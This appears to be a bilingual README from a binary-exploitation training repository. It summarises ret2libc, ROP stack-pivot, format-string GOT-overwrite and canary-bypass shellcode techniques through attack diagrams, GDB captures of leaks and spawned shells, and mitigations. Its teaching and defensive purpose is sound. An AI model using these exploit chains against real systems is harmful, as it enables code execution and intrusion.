# Highlights

Les projets suivants condensent les techniques clés du dépôt. Chaque fiche fournit une vision opérationnelle, des diagrammes ASCII, des extraits GDB et des pistes de mitigation pour capitaliser sur l'apprentissage.

## Ret2libc Real-World Chain (`stack-overflows-ret2main`)
![Technique: ret2libc](https://img.shields.io/badge/Tech-ret2libc-critical?style=flat-square) ![Level: Avancé](https://img.shields.io/badge/Niveau-Avanc%C3%A9-red?style=flat-square) ![Mitigation: NX](https://img.shields.io/badge/Mitigation-NX-black?style=flat-square)

**FR :** Exploitation d'un binaire interactif sans symboles pour chaîner `puts`→`system` en direct, avec calcul d'offset sur la libc déployée. **EN:** Live ret2libc chain against a stripped target, leaking `puts` to recover `system` and `/bin/sh` offsets.

- **Cheat sheet rapide / Quick ref :** [`../stack-overflows/stack-overflows-ret2main`](../stack-overflows/stack-overflows-ret2main)

### Attack Diagram
```
[buffer overflow] -> [saved RBP] -> [saved RIP]
                                 ↳ pop rdi ; ret
                                 ↳ puts@plt -> GOT leak
                                 ↳ main() (re-entry)
Cycle 2:
  pop rdi ; ret -> "bin/sh"
  ret (stack align) -> system@libc
```

### GDB Capture
```gdb
gef➤  pattern create 200
gef➤  run <<< $(cat payload_leak.bin)
[+] leak: puts@libc = 0x7ffff7a5d5f0
gef➤  p/x system
$1 = 0x7ffff7a33440
gef➤  p/x next(*(long long*)(&"/bin/sh"))
$2 = 0x7ffff7b97e9a
gef➤  run <<< $(cat payload_shell.bin)
[*] Switching to interactive mode
$ whoami
pwned
```

### Root Cause Analysis
- Absence de vérification de taille sur l'entrée utilisateur, débordant la pile.
- Sections `plt`/`got` accessibles et non protégées par RELRO total.
- `NX` seul ne suffit pas sans ASLR forte lorsque l'on dispose d'une fuite.

### Mitigations
- Activer `-fstack-protector-strong` et `FORTIFY_SOURCE` pour casser la chaîne simple.
- Compiler avec RELRO complet (`-Wl,-z,relro,-z,now`).
- Activer ASLR + PIE pour rendre l'offset libc imprévisible.

### Key Takeaways
- Toujours boucler après la fuite pour s'assurer que le stack pivot persiste.
- Préparer deux payloads distincts simplifie le script d'exploitation.

---

## Complex ROP Pivot (`stack-overflows-ret2plt-advanced`)
![Technique: ROP](https://img.shields.io/badge/Tech-ROP-critical?style=flat-square) ![Focus: Stack Pivot](https://img.shields.io/badge/Focus-Stack%20Pivot-orange?style=flat-square) ![Level: Expert](https://img.shields.io/badge/Niveau-Expert-purple?style=flat-square)

**FR :** Chaîne ROP multiphase forçant un pivot sur section `.bss` puis appel arbitraire de gadgets `libc`. **EN:** Multi-stage ROP that pivots into `.bss` scratch space before driving libc gadgets.

- **Cheat sheet rapide / Quick ref :** [`../stack-overflows/stack-overflows-ret2plt-advanced`](../stack-overflows/stack-overflows-ret2plt-advanced)

### Memory Flow Diagram
```
Phase 1: main() stack frame
  [overflow] -> leave ; ret -> pivot esp → bss_sandbox
Phase 2: crafted stack on .bss
  ↳ pop rdi ; ret -> GOT printf
  ↳ puts@plt -> leak libc
  ↳ read@plt -> refill .bss with phase 3
Phase 3: final chain
  ↳ pop rdi ; ret -> /bin/sh
  ↳ pop rsi ; pop r15 ; ret -> 0
  ↳ system@libc
```

### GDB Capture
```gdb
gef➤  b *main+178
gef➤  run <<< $(cat payload_stage1.bin)
gef➤  telescope $rsp 5
0x602110: 0x4008fe (leave ; ret) → pivot imminent
gef➤  continue
[+] libc leak: 0x7ffff7a65440
gef➤  dump memory 0x602110 0x602180
0x602128: 0x00000000004007e3 (pop rdi ; ret)
0x602130: 0x0000000000602018 ("/bin/sh" string)
```

### Root Cause Analysis
- Buffer de lecture copié sur la pile sans taille fixe → overflow.
- Gadget `leave ; ret` accessible depuis binaire non PIE.
- Sections `.bss` en lecture/écriture sans canari ni cookies.

### Mitigations
- Activer PIE pour randomiser l'adresse du gadget pivot.
- Vérifier la taille lue vs tampon (`fgets`, `read` borné).
- Initialiser `.bss` avec données non contrôlables ou interdiction de `RWX` dynamiques.

### Key Takeaways
- Préparer un script qui streame plusieurs payloads permet de réutiliser un pivot `.bss`.
- Documenter chaque phase ROP simplifie le debug lors de concours CTF.

---

## Advanced Format String Multi-Write (`format-strings-multiwrite`)
![Technique: Format String](https://img.shields.io/badge/Tech-Format%20String-ff69b4?style=flat-square) ![Focus: Arbitrary Write](https://img.shields.io/badge/Focus-Arbitrary%20Write-green?style=flat-square) ![Level: Avancé](https://img.shields.io/badge/Niveau-Avanc%C3%A9-red?style=flat-square)

**FR :** Chaîne de format construite pour orchestrer plusieurs écritures partielles (`%hn/%hhn`) et injecter une entrée GOT précise. **EN:** Multi-stage format string leveraging `%hn/%hhn` to sculpt a GOT entry in-place.

- **Cheat sheet rapide / Quick ref :** [`../format-strings/format-strings-multiwrite`](../format-strings/format-strings-multiwrite)

### Layout Diagram
```
Stack slots:
  [arg0 -> fmt] "%12$hn%13$hhn..."
  [arg12] GOT entry low bytes
  [arg13] GOT entry mid bytes
  [arg14] GOT entry high bytes
Payload flow:
  leak puts@GLIBC
  compute system offset
  staged writes: low → mid → high
```

### GDB Capture
```gdb
gef➤  run
input> %9$p|%15$s
leak> 0x7ffff7dd2600|/lib/x86_64-linux-gnu/libc.so.6
gef➤  python
from pwntools import fmtstr_payload
fmt = fmtstr_payload(12, {got.exit: system})
print(fmt)
end
gef➤  run <<< $(python make_payload.py)
[*] Hijacked exit@GOT → system
```

### Root Cause Analysis
- `printf(user_input)` sans format contrôlé.
- RELRO partiel seulement : GOT réécrivable.
- Manque de validation sur offsets utilisés dans la chaîne.

### Mitigations
- Proscrire `printf` direct sur entrée utilisateur ; utiliser `printf("%s", input)`.
- Activer RELRO complet pour geler la GOT.
- Filtrer les caractères `%` ou tronquer la chaîne.

### Key Takeaways
- Pré-calculer les deltas d'écriture avec `pwntools.fmtstr_payload` économise du temps.
- Enchaîner `%hhn` → `%hn` limite les retours arrière dans le compteur.

---

## Custom Shellcode vs Canary (`shellcodes-ret2sc-canary`)
![Technique: Shellcode](https://img.shields.io/badge/Tech-Shellcode-blue?style=flat-square) ![Focus: Canary Bypass](https://img.shields.io/badge/Focus-Canary%20Bypass-brown?style=flat-square) ![Level: Intermédiaire](https://img.shields.io/badge/Niveau-Interm%C3%A9diaire-blue?style=flat-square)

**FR :** Construction d'un shellcode polymorphique exécuté après fuite du canari et restauration de la stack propre. **EN:** Polymorphic shellcode deployed after leaking the canary and restoring stack hygiene.

- **Cheat sheet rapide / Quick ref :** [`../shellcodes/shellcodes-ret2sc-canary`](../shellcodes/shellcodes-ret2sc-canary)

### Execution Diagram
```
Step 1: leak canary via format string helper
Step 2: rebuild stack frame -> saved RBP
Step 3: write shellcode into RWX page (mprotect)
Step 4: jump to shellcode → spawn /bin/sh
```

### GDB Capture
```gdb
gef➤  run <<< $(python leak_canary.py)
[+] canary = 0x005a1c0d6f67c800
gef➤  assemble "xor rsi, rsi ; mul esi ; push 0x3b"
Shellcode written to /tmp/sc.bin
gef➤  run <<< $(python exploit.py)
[*] Shellcode landed at 0x601800
gef➤  ni
0x601800: xor rsi, rsi
gef➤  continue
$ id
uid=1000(offsec) gid=1000(offsec) groups=1000(offsec)
```

### Root Cause Analysis
- `read` dépasse la taille du buffer mais le canari reste contournable via fuite.
- Page `.text` exécutable ou `mprotect` autorisé.
- Absence de CFI (Control Flow Integrity) ou de PAC.

### Mitigations
- Remplacer le canari statique par un `__stack_chk_fail` dynamique + terminator canary.
- Désactiver `mprotect` via seccomp ou W^X strict.
- Limiter les syscalls par un sandboxing SELinux/AppArmor.

### Key Takeaways
- Restaurer `rbp`/`rip` avant de sauter sur shellcode évite les crashs tardifs.
- Documenter chaque étape (fuite, patch, exécution) améliore la reproductibilité.
